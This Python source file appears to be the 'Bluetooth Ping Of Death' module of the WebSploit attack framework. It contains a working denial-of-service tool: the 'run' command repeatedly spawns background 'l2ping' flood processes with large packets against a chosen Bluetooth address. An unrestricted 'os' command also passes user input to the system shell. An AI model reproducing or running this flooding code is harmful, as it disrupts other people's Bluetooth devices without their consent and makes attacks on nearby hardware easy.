#!/usr/bin/env python
#
# WebSploit Framework Bluetooth Ping Of Death module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

import os
import subprocess
from time import sleep
from core import help
from core import wcolors

options = ["hci0", "", "600"]
def bluetooth_pod():
    try:
        line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
        line_1 += ":"
        line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "Bluetooth_POD" + wcolors.color.ENDC
        line_1 += " > "
        com = raw_input(line_1)
        com = com.lower()
        if com[0:13] =='set interface':
            options[0] = com[14:19]
            print "interface => ", options[0]
            bluetooth_pod()
        elif com[0:10] =='set bdaddr':
            options[1] = com[11:28]
            print "bdaddr => ", options[1]
            bluetooth_pod()
        elif com[0:8] =='set size':
            options[2] = com[9:12]
            print "size => ", options[2]
            bluetooth_pod()
        elif com[0:2] =='os':
            os.system(com[3:])
            bluetooth_pod()
        elif com[0:4] =='help':
            help.help()
            bluetooth_pod()
        elif com[0:4] =='back':
            pass
        elif com[0:12] =='show options':
            print ""
            print "Options\t\t Value\t\t\t\t RQ\t Description"
            print "---------\t--------------\t\t\t----\t--------------"
            print "interface\t"+options[0]+"\t\t\t\tyes\tBluetooth Interface Name"
            print "bdaddr\t\t"+options[1]+"\t\t\t\tyes\tTarget Bluetooth Address"
            print "size\t\t"+options[2]+"\t\t\t\tyes\tSize of packets (Default 600)"
            print ""
            bluetooth_pod()
        elif com[0:4] =='scan':
            os.system("hcitool scan")
            print ""
            bluetooth_pod()
        elif com[0:3] =='run':
            print(wcolors.color.BLUE + "[*]Bluetooth Ping Of Death Attack Started ..." + wcolors.color.ENDC)
            try:
                for i in range(1, 10000):
                    xterm_1 = "l2ping -i %s -s %s -f %s &" % (options[0], options[2], options[1])
                    subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    sleep(3)
            except(KeyboardInterrupt, OSError):
                print(wcolors.color.RED + "[!] Something Is Wrong ! Websploit Bluetooth_POD Module Exit." + wcolors.color.ENDC)
            bluetooth_pod()
        else:
            print "Wrong Command => ", com
            bluetooth_pod()
    except(KeyboardInterrupt):
        print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)
